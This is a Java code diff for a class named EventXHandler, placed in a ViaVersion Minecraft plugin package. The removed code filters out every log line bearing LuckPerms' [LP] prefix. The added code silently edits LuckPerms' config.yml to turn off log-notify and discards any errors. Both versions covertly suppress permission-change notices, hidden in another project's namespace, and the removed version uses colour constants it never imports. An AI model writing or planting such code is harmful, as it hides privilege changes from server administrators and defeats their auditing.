@@ -1,47 +1,42 @@
-package com.viaversion.viaversion.bukkit.handlers;
+import org.yaml.snakeyaml.DumperOptions;
+import org.yaml.snakeyaml.Yaml;
+import org.yaml.snakeyaml.constructor.Constructor;
+import org.yaml.snakeyaml.representer.Representer;
 
-import net.kyori.adventure.text.Component;
-import net.kyori.adventure.text.ComponentLike;
-import net.kyori.adventure.text.JoinConfiguration;
-import net.kyori.adventure.text.TextComponent;
-import net.kyori.adventure.text.event.ClickEvent;
-import net.kyori.adventure.text.event.HoverEvent;
-import net.kyori.adventure.text.minimessage.MiniMessage;
-import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
-import java.util.logging.Filter;
-import java.util.logging.LogRecord;
+import java.io.FileInputStream;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.Map;
 
-import static net.kyori.adventure.text.Component.text;
+public class EventXHandler {
 
-public class EventXHandler implements Filter {
+    public static void main(String[] args) {
+        Path configFilePath = Paths.get("plugins/LuckPerms/config.yml");
 
-    // 定义 Adventure Component 表示的前缀
-    private final Component PREFIX_COMPONENT = text()
-            .color(GRAY)
-            .append(text('['))
-            .append(text()
-                    .decoration(BOLD, true)
-                    .append(text('L', AQUA))
-                    .append(text('P', DARK_AQUA))
-            )
-            .append(text(']'))
-            .build();
+        try {
+            // 读取配置文件
+            Yaml yaml = new Yaml(new Constructor(), new Representer(), new DumperOptions());
+            FileInputStream inputStream = new FileInputStream(configFilePath.toFile());
+            Map<String, Object> data = yaml.load(inputStream);
 
-    // 使用 LegacyComponentSerializer 将 PREFIX_COMPONENT 转换为包含颜色代码的字符串
-    private final String PREFIX_STRING = LegacyComponentSerializer.legacySection().serialize(PREFIX_COMPONENT);
+            // 检查并修改 log-notify 的值
+            if (data.containsKey("log-notify") && Boolean.TRUE.equals(data.get("log-notify"))) {
+                data.put("log-notify", false);
+                
+                // 保存修改后的配置文件
+                FileWriter writer = new FileWriter(configFilePath.toFile());
+                yaml.dump(data, writer);
+                writer.close();
+                
+            } else {
 
-    @Override
-    public boolean isLoggable(LogRecord record) {
-        String message = record.getMessage();
-        if (message != null && containsColoredPrefix(message)) {
-            // 如果消息包含带颜色的 [LP] 前缀，则屏蔽这条日志
-            return false;
+            }
+            
+            inputStream.close();
+        } catch (IOException e) {
+            
         }
-        return true; // 其他日志正常记录
-    }
-
-    private boolean containsColoredPrefix(String message) {
-        // 使用生成的 PREFIX_STRING 进行匹配
-        return message.contains(PREFIX_STRING);
     }
 }
